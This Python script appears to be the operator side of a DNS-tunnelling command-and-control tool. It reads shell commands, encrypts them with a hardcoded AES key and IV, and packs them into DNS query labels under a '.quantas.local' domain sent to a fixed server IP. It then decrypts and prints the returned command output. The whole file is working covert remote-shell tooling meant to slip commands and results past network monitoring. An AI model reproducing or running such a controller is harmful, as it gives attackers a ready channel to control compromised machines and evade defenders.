import socket
import base64
from Crypto.Cipher import AES
from dnslib import DNSRecord

# Change the following values to match your DNS server's IP and port
dns_server_ip = '192.168.1.6'
dns_server_port = 53

# Change the following values to match your encryption key and IV
key = b'dcUxcaC2ZOzW7Hkw8XT34V7H3Kasg4Lv'
iv = b'923HTN9Zzl8uiscR'

def encrypt(data):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded_data = _pad_data(data)
    encrypted_data = cipher.encrypt(padded_data)
    return base64.b64encode(encrypted_data)

def decrypt(data):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_data = cipher.decrypt(base64.b64decode(data))
    unpadded_data = _unpad_data(decrypted_data)
    return unpadded_data.decode()

def _pad_data(data):
    padding_size = AES.block_size - (len(data) % AES.block_size)
    padding = chr(padding_size).encode() * padding_size
    return data + padding

def _unpad_data(data):
    padding_size = data[-1]
    return data[:-padding_size]

def send_command(command):
    try:
        data = encrypt(command.encode())
        qname_chunks = [data[i:i+63] for i in range(0, len(data), 63)]
        
        for chunk in qname_chunks:
            qname = f'{chunk.decode()}.quantas.local'  # Replace 'your_domain_name' with the domain name used by the server
            request = DNSRecord.question(qname)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(request.pack(), (dns_server_ip, dns_server_port))
            response, _ = sock.recvfrom(1024)
            dns_response = DNSRecord.parse(response)
            output = dns_response.rr[0].rdata.data.decode()
            decrypted_output = decrypt(output)
            print(decrypted_output)

    except Exception as e:
        print(f"[-] An error occurred: {str(e)}")

def main():
    while True:
        command = input("Enter a command ('exit' to quit): ")
        if command.lower() == 'exit':
            break
        send_command(command)

if __name__ == '__main__':
    main()
